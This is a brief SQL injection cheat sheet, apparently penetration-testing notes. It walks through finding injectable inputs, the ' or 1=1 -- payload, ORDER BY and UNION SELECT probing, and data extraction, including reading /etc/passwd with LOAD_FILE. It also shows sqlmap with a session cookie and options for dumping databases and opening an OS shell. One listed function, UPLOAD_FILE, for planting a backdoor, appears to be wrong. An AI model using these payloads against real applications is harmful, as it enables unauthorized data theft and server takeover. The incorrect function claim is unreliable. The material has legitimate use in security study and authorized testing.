# Description

Vulnerability that allow the attacker to interfere with SQL queries.
Generally allows the attacker to retrieve data that should not be viewed or even modify/delete it.


# Usage
Find any input which will be part of a SQL Query

Inputs examples:
- Form field input
- URL parameter

In the input vulnerable to SQL injection, insert:

    ' or 1=1 --


Finishing the query with `;` instead of `--` will most likely end up throwing an error

# Exploitation

Step 1: Find out the number of columns fetched

    ' ORDER BY <num> --
Increment `<num>` until an error is thrown

Step 2: Display injected data

    ' UNION SELECT 1,2,3,...,<num> --

This inject "1", "2"... in the query's result.  
If you are manipulating a php page with an ID like `edit.php?id=1' UNION SELECT 1,2,3,4--`, you can change the id until your data is displayed

Step 3: Extract information

Once your data is displayed, switch from data injection to data extraction by replacing `UNION SELECT 1,2,3,4` with something like

    UNION SELECT @@version, user() ...

Useful functions:
- `@@version` Version of the SQL server
- `user()` Current user running the query
- `LOAD_FILE('/etc/passwd')` Loads a requested file
- `UPLOAD_FILE('<filepath>')` That could be used with XSS to upload a backdoor
- `UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'` Get the users table's column names (MySQL)

# Tool

## sqlmap
automatic SQL injection tool   
https://www.kali.org/tools/sqlmap/  
https://manpages.org/sqlmap

sqlmap goal is to detect and take advantage of SQL injection vulnerabilities in web applications.  
Once it detects one or more SQL injections on the target host, the user can choose among a variety of options to
- perform an extensive back-end database management system fingerprint,
- retrieve DBMS session user and database
- enumerate users
- password hashes
- privileges
- databases
- dump entire or user’s specific DBMS tables/columns
- run his own SQL statement
- read specific files on the file system and more.

### Usage

    sqlmap -u "<page with sql inj. vuln>" --cookie "<session cookie>"

Options:
- `--dump` SQL dump of the database
- `--os-shell` Prompt for an interactive operating system shell  
  Needs to know which web application language the web server supports
- `--sql-shell` Prompt for an interactive SQL shell
